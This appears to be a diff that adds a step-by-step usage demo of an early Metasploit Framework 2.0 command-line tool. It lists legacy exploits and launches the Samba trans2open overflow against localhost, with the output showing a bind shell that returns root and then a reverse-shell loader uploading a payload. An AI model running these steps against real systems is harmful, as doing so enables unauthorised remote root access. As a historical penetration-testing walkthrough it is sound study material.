@@ -1,0 +1,100 @@
+1) Pick an exploit
+
+hdm@ice framework-v2.0 $ ./cli 
+============
+= Exploits
+
+  0x00  Apache Win32 Chunked Encoding
+  0x01  Exchange 2000 MS03-46 Heap Overflow
+  0x02  Frontpage fp30reg.dll Chunked Encoding
+  0x03  IIS 5.0 nsiislog.dll POST Overflow
+  0x04  IIS 5.0 Printer Buffer Overflow
+  0x05  IIS 5.0 WebDAV ntdll.dll Overflow
+  0x06  Microsoft RPC DCOM MSO3-026 NT 2K/XP
+  0x07  Microsoft RPC DCOM MSO3-026 NT 4.0
+  0x08  Samba trans2open Overflow
+  0x09  Solaris sadmind Remote Exec
+  0x0a  War-FTPD 1.65 PASS Overflow
+
+
+2) Show exploit information
+
+hdm@ice framework-v2.0 $ ./cli 0x08 s
+==================
+= Information
+
+   Name: Samba trans2open Overflow
+Version: 2.0
+ Author: H D Mooore <hdm[at]metasploit.com>
+    URL: http://www.digitaldefense.net/labs/advisories/DDI-1013.txt
+
+This exploits the buffer overflow found in Samba versions
+2.2.0 to 2.2.8. This particular module is capable of
+exploiting the bug on x86 Linux and FreeBSD systems.
+
+
+3) Show available payloads
+
+hdm@ice framework-v2.0 $ ./cli 0x08 p
+============
+= Payloads
+
+  bsdx86reverse         Connect back to attacker and spawn a shell
+  ie_linx86_bind        Listen to a port and spawn shell
+  ie_linx86_reverse     Connect to attacking system and spawn shell
+  linx86bind            Listen for connection and spawn a shell
+  linx86reverse         Connect back to attacker and spawn a shell
+
+
+4) Pick a payload and show options
+
+hdm@ice framework-v2.0 $ ./cli 0x08 payload=ie_linx86_bind o
+============
+= Options
+
+  required:             RHOST          The target address
+  required:             RPORT          The samba port
+
+  required:             LPORT          Local port to receive connection
+
+
+5) Fill in options and try a vulnerability check
+
+hdm@ice framework-v2.0 $ ./cli 0x08 payload=ie_linx86_bind rhost=127.0.0.1 rport=139 lport=31337 c
+[*] Check: No check has been implemented for this module
+
+
+6) Launch the exploit
+
+hdm@ice framework-v2.0 $ ./cli 0x08 payload=ie_linx86_bind rhost=127.0.0.1 rport=139 lport=31337 e
+[*] Starting handler bind_shell
+[*] Starting brute force mode...
+[*] Trying return address 0xbfffffdc
+[ snip ]
+[*] Trying return address 0xbfffa7dc
+[*] Connected to 127.0.0.1:31337...
+
+bash: no job control in this shell
+bash-2.05b# id -a
+uid=0(root) gid=0(root) groups=65534(nobody)
+
+
+7) Try the Impurity loader :)
+
+hdm@ice framework $ ./cli 0x08 payload=linx86_revimp rhost=127.0.0.1 rport=139 lport=31337 lhost=127.0.0.1 pexec=./impurity/shelldemo e
+[*] Starting handler impurity_reverse
+[*] Starting brute force mode...
+[*] Trying return address 0xbfffffdc
+[*] Trying return address 0xbffffddc
+[*] Trying return address 0xbffffbdc
+[*] Trying return address 0xbffff9dc
+[*] Trying return address 0xbffff7dc
+[*] Trying return address 0xbffff5dc
+[*] Trying return address 0xbffff3dc
+[*] Trying return address 0xbffff1dc
+[*] Connection from 127.0.0.1:33123...
+[*] Uploading 12796 bytes... Done
+[*] Switching to impurity payload
+
+--=[ Impurity Demo Shell
+impurity demo > 
